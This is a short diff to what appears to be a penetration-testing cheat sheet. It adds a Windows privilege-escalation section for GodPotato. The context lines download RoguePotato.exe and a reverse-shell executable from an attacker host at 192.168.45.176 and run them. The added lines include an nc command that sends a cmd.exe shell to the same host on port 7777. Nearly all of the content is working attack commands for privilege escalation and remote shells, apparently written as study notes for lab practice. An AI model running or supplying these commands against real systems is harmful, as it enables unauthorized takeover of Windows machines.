@@ -1122,7 +1122,13 @@ iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
 iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
 
 .\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
-
 ```
+
+### Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
+```bash
+GodPotato -cmd "cmd /c whoami"
+GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
+```
+
 
 
